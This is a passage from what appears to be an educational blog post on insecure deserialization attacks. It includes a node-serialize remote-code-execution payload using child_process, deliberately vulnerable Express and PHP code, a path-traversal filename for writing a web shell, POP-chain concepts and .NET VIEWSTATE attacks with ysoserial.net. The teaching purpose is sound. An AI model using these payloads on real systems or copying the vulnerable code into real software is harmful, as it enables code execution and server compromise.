</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function() {require('child_process').execSync('sleep 5')}</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span><span class="mf">12453464564.2675</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><em>Note: The <code class="language-plaintext highlighter-rouge">child_process</code> library is built-in in Node.js, so there is no need to worry.</em></p>

<p>Now making some modifications to the output, note that in addition to <code class="language-plaintext highlighter-rouge">()</code>, a return value will be added to the function with the same value previously obtained in the initial request to avoid conflicting with the expected behavior of the application:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">{</span>
    <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function() {require('child_process').execSync('sleep 5');return </span><span class="dl">"</span><span class="nx">hendrich</span><span class="p">@</span><span class="nd">blog</span><span class="p">.</span><span class="nx">com</span><span class="p">.</span><span class="nx">br</span><span class="dl">"</span><span class="s2">;}()</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="mf">12453464564.2675</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this case, note that the one unserializing could be an API and not the application itself.</p>

<p>For this application, this could be the back-end:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">cookieParser</span><span class="p">());</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/verify</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">userInfo</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">);</span>

            <span class="kd">let</span> <span class="nx">rawdata</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">users.json</span><span class="dl">'</span><span class="p">);</span>
            <span class="kd">let</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">rawdata</span><span class="p">);</span>

            <span class="kd">let</span> <span class="nx">valid_user</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
            <span class="nx">users</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">user</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">===</span> <span class="nx">userInfo</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="nx">userInfo</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">valid_user</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">});</span>

            <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">status</span><span class="p">:</span> <span class="nx">valid_user</span><span class="p">});</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">status</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Invalid session data</span><span class="dl">'</span><span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">status</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">No session cookie found</span><span class="dl">'</span><span class="p">});</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Server running on port 3000</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The application directly unserializes the session cookie using <code class="language-plaintext highlighter-rouge">node-serialize</code> without validating or sanitizing the input. This allows an attacker to craft a malicious serialized object and send it as a cookie.</p>

<h2 id="pop-chains-concept"><span class="me-2">Pop Chains Concept</span><a href="#pop-chains-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p>Code-reuse / POP-Attack refers to utilizing existing parts of the application to manipulate it as desired.</p>

<p>In other words, it involves chaining existing properties of the application to execute a specific action, such as RCE, SQL Injection, etc.</p>

<p><strong>Attack Surface</strong></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%205.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>

<p>In most programming languages, there are three main pillars: Code, Libraries (libs), and Frameworks.</p>

<p>In languages like Java and .NET, there is another pillar: the Operating System (OS), where it is possible to use the runtime of the OS in the insecure deserialization process, executing built-in system functions.</p>

<p>In most applications, frameworks dominate the majority of the code. Next are the libraries used in the application to avoid rewriting large parts of the code. Then, the code written by the developer.</p>

<p>Often, the popchain process is used on the libraries and frameworks instead of directly attacking the developed application. Thus, a serialization gadget is manually assembled, reusing code (Code-reuse attack) to execute a specific action.</p>

<p><strong>Code Review in Applications</strong></p>

<p><strong>Example 01: Code with vulnerability created by the developer.</strong></p>

<p>index.php</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">require_once</span> <span class="s2">"class/Auth.class.php"</span><span class="p">;</span>

<span class="nv">$auth</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Auth</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$auth</span><span class="o">-&gt;</span><span class="nf">isLogged</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$auth</span><span class="o">-&gt;</span><span class="nf">isSuperUser</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Welcome, super user!"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"You are not logged in or you are not a super user!"</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Auth.class.php</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> 

<span class="kd">class</span> <span class="nc">Auth</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$auth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'randomUser'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$role</span> <span class="o">=</span> <span class="s1">'guest'</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">])</span> <span class="k">and</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">])){</span>
            <span class="nv">$session</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]));</span> <span class="c1"># 1</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">auth</span> <span class="o">=</span> <span class="nv">$session</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">];</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$session</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">=</span> <span class="nv">$session</span><span class="p">[</span><span class="s1">'role'</span><span class="p">];</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'session'</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="p">)),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">);</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">isLogged</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">isSuperUser</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">==</span> <span class="s1">'superuser'</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">==</span> <span class="s1">'superuser'</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"Welcome, super user!"</span><span class="p">;</span>
            <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'superuser.txt'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="p">));</span> <span class="c1"># 2</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"You are not logged in or you are not a super user!"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h1 id="1--insecure-deserialization-it-is-deserializing-data-coming-directly-from-the-user">1:  Insecure deserialization. It is deserializing data coming directly from the user.</h1>

<h1 id="2-path-traversal-the-username-becomes-varhtmlshellphp-and-writes-the-session-cookie-content">2: Path Traversal, the username becomes <code class="language-plaintext highlighter-rouge">../../../../../var/html/shell.php</code> and writes the session cookie content.</h1>

<p><strong>Example 02: Code with vulnerability generated from using a LIB.</strong></p>

<p>In this case, the <strong>Laravel</strong> framework will be used. If you want to simulate it, here are the docker configurations.</p>

<p><strong>docker-compose.yml</strong></p>

<div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre>version: '3.8'

services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: laravel_app
    ports:
      - "9000:9000"
    volumes:
      - ./app:/var/www/html
    working_dir: /var/www/html
    command: bash -c "composer install &amp;&amp; php-fpm"

  web:
    image: nginx:alpine
    container_name: laravel_web
    ports:
      - "8080:80"
    volumes:
      - ./app:/var/www/html
      - ./nginx.conf:/etc/nginx/conf.d/default.conf
    depends_on:
      - app

  composer:
    image: composer:latest
    container_name: laravel_composer
    volumes:
      - ./app:/var/www/html
    working_dir: /var/www/html
    command: bash -c "composer create-project --prefer-dist laravel/laravel ."
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Dockerfile</strong></p>

<div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> php:8.2-fpm</span>

<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> <span class="se">\
</span>    git <span class="se">\
</span>    unzip

<span class="k">RUN </span>curl <span class="nt">-sS</span> https://getcomposer.org/installer | php <span class="nt">--</span> <span class="nt">--install-dir</span><span class="o">=</span>/usr/local/bin <span class="nt">--filename</span><span class="o">=</span>composer

<span class="k">WORKDIR</span><span class="s"> /var/www/html</span>

</pre></td></tr></tbody></table></code></div></div>

<p><strong>nginx.conf</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>server {
    listen 80;
    index index.php index.html;
    server_name localhost;

    root /var/www/html/public;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass app:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Commands</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>docker-compose build
docker-compose up -d
docker-compose run --rm app composer install
docker-compose run --rm app php artisan key:generate
</pre></td></tr></tbody></table></code></div></div>

<p>Observe that inside the vendor folder there are various libraries installed by default in the application. The diversity of libraries installed does not necessarily mean they will all be used by you, not to mention the code that comes with them.</p>

<p><a href="/../assets/img/study/attackserialization/Untitled%206.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>

<p>This expands the possibilities that if any of these libraries have vulnerabilities, they can be exploited by an attacker in the application.</p>

<p>For example, looking for libraries that execute a <code class="language-plaintext highlighter-rouge">file_put_contents</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%207.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>

<p>If somehow the parameters could be manipulated, RCE could be achieved through Code-reuse.</p>

<p><strong>Requirements to use Popchain and achieve RCE:</strong></p>

<ul>
  <li><strong>Trusted User Input:</strong>
    <ul>
      <li>The system must trust user inputs, such as in the case of <code class="language-plaintext highlighter-rouge">unserialize</code> or <code class="language-plaintext highlighter-rouge">json_decode</code>, where the data can be manipulated by the attacker.</li>
    </ul>
  </li>
  <li><strong>Magic Methods:</strong>
    <ul>
      <li>Utilization of magic methods like <code class="language-plaintext highlighter-rouge">__wakeup</code> and <code class="language-plaintext highlighter-rouge">__destruct</code> which allow the execution of code during the deserialization and destruction of objects.</li>
    </ul>
  </li>
  <li><strong>Gadget Chain:</strong>
    <ul>
      <li>Construction of a gadget chain. Gadgets are small pieces of existing code in the application that can be chained together to form a logical sequence that the attacker can control to achieve arbitrary code execution.</li>
    </ul>
  </li>
  <li><strong>Code Reuse:</strong>
    <ul>
      <li>The ability to reuse existing code (in libraries, frameworks, or the application’s own code) to execute malicious actions, such as <code class="language-plaintext highlighter-rouge">file_put_contents</code> to write files or <code class="language-plaintext highlighter-rouge">system</code> to execute commands.</li>
    </ul>
  </li>
</ul>

<h2 id="serialization-in-net"><span class="me-2">Serialization in .NET</span><a href="#serialization-in-net" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p><em>Instead of using just one universal method like <code class="language-plaintext highlighter-rouge">serialize()</code>, it uses a few different mechanisms for serialization and de-serialization of data.</em></p>

<p><em>Data <strong>serialized</strong> using one of these <strong>mechanisms</strong> must be <strong>de-serialized using the same one</strong>.</em></p>

<p>Saving the states of objects using serialization in .NET can be done using various methods.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">BinaryFormatter</code> → <em>Serializes data to a binary file</em></li>
  <li><code class="language-plaintext highlighter-rouge">DataContractSerializer</code> → <em>Serializes data to XML with more control over the serialization process through attributes.</em></li>
  <li><code class="language-plaintext highlighter-rouge">NetDataContractSerializer</code> → <em>Similar to <code class="language-plaintext highlighter-rouge">DataContractSerializer</code> but includes .NET-specific type information, making it suitable for scenarios where both ends are .NET</em></li>
  <li><code class="language-plaintext highlighter-rouge">XMLSerialization</code> →  <em>Serializes objects to XML, focusing on a simple and human-readable format.</em></li>
</ul>

<p>Each of these serialization types is connected directly to certain supported objects and types. Usage of them is <strong>situational</strong> and connected to <strong>.NET internals</strong></p>

<h3 id="generic-way-to-attack-using-ysoserialnet"><span class="me-2"><em>Generic way to attack using ysoserial.net</em></span><a href="#generic-way-to-attack-using-ysoserialnet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>Is a versatile tool and a <strong>.NET</strong> equivalent of java’s <strong>ysoserial.jar</strong></em></p>

<p><strong>Exemplifying <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> serialization mechanism.</strong> - Now days is obsolete</p>

<p><em><strong>.NET console application</strong> → Application serializes a string and writes the output to a file - is in binary format, as per the name of the serialization logic.</em></p>

<div class="language-csharp highlighter-rouge"><div class="code-header">
        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>

<span class="k">using</span> <span class="nn">CenterSpace.NMath.Core</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">CenterSpace.NMath.Core.Examples.CSharp</span> 
<span class="p">{</span>
	<span class="k">class</span> <span class="nc">BinarySerializationExample</span> 
	<span class="p">{</span>
		<span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">"data.dat"</span><span class="p">;</span>
		
		<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
		
			<span class="c1">// Delete old file, if it exists</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Deleting old file"</span><span class="p">);</span>
				<span class="n">File</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
			<span class="p">}</span>
			
			<span class="c1">// Create String</span>
			<span class="kt">var</span> <span class="n">u</span> <span class="p">=</span> <span class="s">"Some String here"</span><span class="p">;</span>
			
			<span class="c1">// Persist to file</span>
			<span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
			<span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">BinaryFormatter</span><span class="p">();</span> <span class="c1">// serialization mechanism </span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Serializing string"</span><span class="p">);</span>
			<span class="n">formatter</span><span class="p">.</span><span class="nf">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">u</span><span class="p">)</span>
			<span class="n">stream</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
			
			<span class="c1">// Restore from file</span>
			<span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="nf">OpenRead</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Deserializing string"</span><span class="p">);</span>
			<span class="kt">var</span> <span class="n">v</span> <span class="p">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">formatter</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
			<span class="n">stream</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
			
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Press Enter Key"</span><span class="p">);</span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">Read</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">type data</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%208.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>

<p>The serialize data in the file, indeed, it`s in binary format.</p>

<p>Thus, you can expect serialized .NET data encountered in WebAPP to be <strong>base64 encoded</strong> in order to conveniently send non-ASCII chars in HTTP requests and responses.</p>

<p>A <strong>common</strong>, but <strong>not the only place</strong> where serialized data can be found is when data is sent in a <strong>VIEWSTATE</strong> parameter or <strong>.NET remoting services</strong></p>

<h3 id="net-remoting-services"><span class="me-2"><em>.NET remoting services</em></span><a href="#net-remoting-services" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>Can be considered part of the WebAPP world but they`re also part of the infrastructure.</em></p>

<p>.NET remoting is the mechanics that <strong>allows sending pure</strong> .NET objects <strong>via TCP</strong>.</p>

<p>However, depending on the application infrastructure, WebAPP may provide a layer of transport to supply data destined to a .NET remoting endpoint.</p>

<p><a href="https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/">https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/</a></p>

<h3 id="viewstate"><span class="me-2"><em>VIEWSTATE</em></span><a href="#viewstate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>Is a <strong>pure web parameter</strong> that is used in the majority of .NET WebAPP in order to <strong>persist the state</strong> of the current web page.</em></p>

<p><em>Is the state of the page and all its controls. It’s automatically maintained across the WebAPP by the <strong>ASP.NET</strong> framework.</em></p>

<p>When a page is sent back to the client, the changes in the properties of the page and its controls are determined, and then, they’re stored in the value of a <strong>hidden input field</strong> <code class="language-plaintext highlighter-rouge">_VIEWSTATE</code></p>

<p>With <strong>every other POST request</strong>, the <code class="language-plaintext highlighter-rouge">_VIEWSTATE</code> field is sent to the server together with other parameters.</p>

<p>The <strong>Viewstate</strong> has a form of <strong>serialized data</strong> which <strong>gets deserialized when sent to the server</strong>.</p>

<p><em>Of course, the later the .NET framework on server side, the more <strong>countermeasures</strong> will be in place. It would be too easy if the framework would let the users freely tamper the content of VIEWSTATE</em></p>

<p>Latest countermeasures against <strong>VIEWSTATE tampering are:</strong></p>

<ul>
  <li><strong>MAC Enabled option</strong> → <em>Viewstate is signed with a cryptographic key known only by the server-side. It’s configured by the following settings/option <code class="language-plaintext highlighter-rouge">&lt;page enableViewState=Mac"true" /&gt;</code></em></li>
  <li><strong>Web.config</strong> or “<strong>Setting MAC validation in IIS manager</strong>”→ <em>The latest .NET framework uses MAC validation by default</em></li>
  <li>Encrypt → <strong><code class="language-plaintext highlighter-rouge">*&lt;page ViewStateEncryptionMode="Always" /&gt;*</code></strong></li>
</ul>

<p>However, if the key is <strong>hardcoded</strong>, it might be leaked as a result of file read vulnerabilities like XXE, LFI, etc.</p>

<p>If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization <strong>only if</strong> the MAC key is hardcoded (e.g. in web.config)</p>

<p><strong>Burp</strong> displays information about the MAC. In the Pro version of <strong>Burp suite,</strong> such a case is automatically triggered as <strong>potential vulnerability</strong>.</p>

<p>Example, generate a payload using <strong>ysoserial.net</strong> and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hello.aspx.cs</code> (backend)</p>

